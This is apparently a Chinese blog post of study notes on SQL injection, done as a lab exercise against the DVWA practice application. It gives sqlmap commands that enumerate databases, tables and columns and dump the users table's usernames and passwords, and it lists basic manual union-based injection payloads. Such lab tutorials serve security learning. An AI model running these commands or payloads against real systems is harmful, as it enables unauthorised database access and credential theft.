---
title: SQLmap及SQL注入'Demo
published: 2023-04-13
description: "SQLmap及SQL注入'Demo 笔记"
# image: "./cover.webp"
tags: ["网络安全","护网", "靶场"]
category: 网络安全
draft: false
---

<a name="NkINp"></a>
### SQLmap
使用环境：DVWA

![image.png](https://cdn.nlark.com/yuque/0/2023/png/1295434/1686734103339-d274f2cc-9ef6-4f64-b6d6-a1cb6f46fb0c.png#averageHue=%23d8d8d7&clientId=u17fbc989-864a-4&from=paste&height=733&id=u4efd6a89&originHeight=733&originWidth=904&originalType=binary&ratio=1&rotation=0&showTitle=false&size=51830&status=done&style=none&taskId=uc5ec5b61-8987-4186-a88f-7c0e11940ac&title=&width=904)<br />在User ID：随意输入数字<br />由brupSuite拦截到，可获得<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/1295434/1686734183112-e09d8f04-f14d-4703-9b44-2f399a6c4434.png#averageHue=%23949e6e&clientId=u17fbc989-864a-4&from=paste&height=474&id=u3ca6a5b7&originHeight=474&originWidth=1034&originalType=binary&ratio=1&rotation=0&showTitle=false&size=68053&status=done&style=none&taskId=u1a771ed2-a425-49c8-a39f-5de7a3b1703&title=&width=1034)<br />全部选中，复制到sqlmap根目录，新建个.txt文件<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/1295434/1686734251544-0f99d94c-0018-4058-a8ea-d16902129234.png#averageHue=%23363f49&clientId=u17fbc989-864a-4&from=paste&height=433&id=u800a1740&originHeight=433&originWidth=1036&originalType=binary&ratio=1&rotation=0&showTitle=false&size=59977&status=done&style=none&taskId=u1cb547f4-8c9b-48e7-ab55-0ada455d726&title=&width=1036)<br />然后在CMD中运行sqlmap：<br />py .\sqlmap.py -r .\sql.txt<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/1295434/1686734322385-0ab13aa2-da5d-41c4-9bd1-07ea145f8af0.png#averageHue=%23141414&clientId=u17fbc989-864a-4&from=paste&height=860&id=u2b9bb10b&originHeight=860&originWidth=1337&originalType=binary&ratio=1&rotation=0&showTitle=false&size=116978&status=done&style=none&taskId=uf474e90e-9de8-460b-877e-e558dac7af7&title=&width=1337)<br />这里sqlmap扫出了php版本、Nginx版本以及所用数据库及版本<br />再使用<br />py .\sqlmap.py -r .\sql.txt --dbs<br />扫出了其中包含的数据库和四种类型的注入漏洞<br />(布尔盲注、报错注入、延时注入、联合查询注入)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/1295434/1686734589600-28015f34-9130-480d-a5f3-7267c71cb753.png#averageHue=%23141414&clientId=u17fbc989-864a-4&from=paste&height=968&id=u2ac67d82&originHeight=968&originWidth=1342&originalType=binary&ratio=1&rotation=0&showTitle=false&size=131577&status=done&style=none&taskId=uae374386-dd60-43ed-9ea8-6bbbb241a97&title=&width=1342)

输入<br />py .\sqlmap.py -r .\sql.txt -D dvwa --tables<br />查询到dvwa数据库下，含有的数据表<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/1295434/1686734992308-a7c8cd98-cba0-4789-9a90-f79603e64493.png#averageHue=%23121212&clientId=u17fbc989-864a-4&from=paste&height=159&id=ud8603163&originHeight=159&originWidth=589&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11330&status=done&style=none&taskId=u85a6aa8d-4a92-41c3-b3d6-6398f12b3d3&title=&width=589)

py .\sqlmap.py -r .\sql.txt -D dvwa -T users --columns<br />查看users表中的字段，看到有user、password<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/1295434/1686735146689-ca3b1663-45c7-4b9d-ac35-1214bb05a795.png#averageHue=%23161616&clientId=u17fbc989-864a-4&from=paste&height=324&id=u8976d598&originHeight=324&originWidth=469&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24557&status=done&style=none&taskId=udd91edb9-ce51-459b-a167-399ec723353&title=&width=469)<br />py .\sqlmap.py -r .\sql.txt -D dvwa -T users -C user,password --dump<br />扫出user和password的数据<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/1295434/1686735950610-94d1a920-ad01-45db-b5d9-b99bb47bd585.png#averageHue=%23191919&clientId=u17fbc989-864a-4&from=paste&height=350&id=u9fe66434&originHeight=350&originWidth=675&originalType=binary&ratio=1&rotation=0&showTitle=false&size=42146&status=done&style=none&taskId=uf045d086-5f47-4597-a728-03bcebce8fb&title=&width=675)

<a name="ZBV8t"></a>
### SQL注入
sql 注入的核心<br />将用户输入的数据拼接到代码中，并被当成 sql 语句执行。<br />SQL注入类型：<br />联合注入：在最后拼接 union select <br />布尔注入：看网页显示是否正常<br />延时注入：利用sleep()方法看数据库是否执行<br />报错注入：利用数据库的错误回显获取数据<br />宽字节注入：写入大量辣鸡字符<br />堆叠注入：利用分号来拼接多条语句

基础步骤：<br />判断注入点<br />id=1 and 1=2<br />判断字段数<br />id=1 order by 1<br />判断回显点<br />id=1 and 1=2 union select 1,2,3<br />查询相关内容<br />id=1 and 1=2 union select 1,database(),3


